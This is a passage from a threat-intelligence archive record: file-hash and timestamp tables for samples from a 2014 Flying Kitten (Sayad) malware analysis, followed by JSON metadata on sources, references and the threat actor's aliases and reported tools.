exe\n\n\n-----\n\n**==================================================**\n\nFilename     : ~8f60957b3689075fa093b047242c0255.exe\n\nMD5        : 72641dedb31280b78bf6a0f184ef29b6\n\nSHA1       : 69fd05ca3a7514ea79480d1dbb358fab391e738d\n\nSHA-256      :\n\n780c86ec885ea48316995ae69965e314a750848413f94907cf54bdeba09b5c3c\n\nModified Time   : 14/07/2014 9:53:14 AM\n\nCreated Time   : 19/07/2014 12:00:58 PM\n\nFile Size     : 321,008\n\nFile Version   : 1.0.0.0\n\nProduct Version  : 1.0.0.0\n\nIdentical     :\n\nExtension     : exe\n\nFile Attributes  : A\n\n**==================================================**\n\n**==================================================**\n\nFilename     : DiagnosticsService.dll\n\nMD5        : 432a79f8f1402cb2622b27e26e900d55\n\nSHA1       : 8521eefbf7336df5c275c3da4b61c94062fafdda\n\nSHA-256      :\n\nbae3171917daf3eb498ae2fb1d0fcbfbb684a5314a8cbef2d5e3bd4c30ece8e1\n\nModified Time   : 17/07/2014 10:16:25 AM\n\nCreated Time   : 17/07/2014 2:17:55 PM\n\nFile Size     : 150,528\n\nFile Version   : 1.0.0.0\n\nProduct Version  : 1.0.0.0\n\nIdentical     :\n\nExtension     : dll\n\nFile Attributes  : A\n\n**==================================================**\n\n**==================================================**\n\nFilename     : sqlite3.dll\n\nMD5 **: 529ecf76409537ab5ac140a5e6fec79d**\n\n\n-----\n\nSHA 256      :\n\nc8571f963541414666397dce06657594560eed4943c93780eb7a2358f0645515\n\nModified Time   : 17/07/2014 10:16:43 AM\n\nCreated Time   : 17/07/2014 2:17:55 PM\n\nFile Size     : 291,328\n\nFile Version   :\n\nProduct Version  :\n\nIdentical     :\n\nExtension     : dll\n\nFile Attributes  : A\n\n**==================================================**\n\n**==================================================**\n\nFilename     : base.dll\n\nMD5        : 4a67b19c02d5cfdebcd85b7395d09881\n\nSHA1       : 082da03918039125dcf1f096a13ffa9ab6a56bde\n\nSHA-256      :\n\n35cd39d419ab386aaa534b4ce95aa7fcda696ef6960fd103beaecf71bacd7398\n\nModified Time   : 17/07/2014 10:16:26 AM\n\nCreated Time   : 17/07/2014 2:17:55 PM\n\nFile Size     : 361\n\nFile Version   :\n\nProduct Version  :\n\nIdentical     :\n\nExtension     : dll\n\nFile Attributes  : A\n\n**==================================================**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/hjjb0aysslxse1ehpyt5ny68lf8tyctg",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.07.20.Flying_Kitten/Sayad_Flying_Kitten_analysis.pdf"
    ],
    "report_names": [
        "Sayad_Flying_Kitten_analysis"
    ],
    "threat_actors": [
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8faa11f5-2a14-479c-9ea8-3779e6de9749",
            "created_at": "2022-10-25T15:50:23.814205Z",
            "updated_at": "2025-03-27T02:00:55.551798Z",
            "deleted_at": null,
            "main_name": "Ajax Security Team",
            "aliases": [
                "Ajax Security Team",
                "Operation Woolen-Goldfish",
                "AjaxTM",
                "Rocket Kitten",
                "Flying Kitten",
                "Operation Saffron Rose"
            ],
            "source_name": "MITRE:Ajax Security Team",
            "tools": [
                "sqlmap",
                "Havij"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041372,
    "ts_creation_date": 1417626119,
    "ts_modification_date": 1417626119,
    "files": {
        "pdf": "https://archive.orkl.eu/591cef00735f510079e0fe4bd0067ca0150fd004.pdf",
        "text": "https://archive.orkl.eu/591cef00735f510079e0fe4bd0067ca0150fd004.txt",
        "img": "https://archive.orkl.eu/591cef00735f510079e0fe4bd0067ca0150fd004.jpg"
    }
}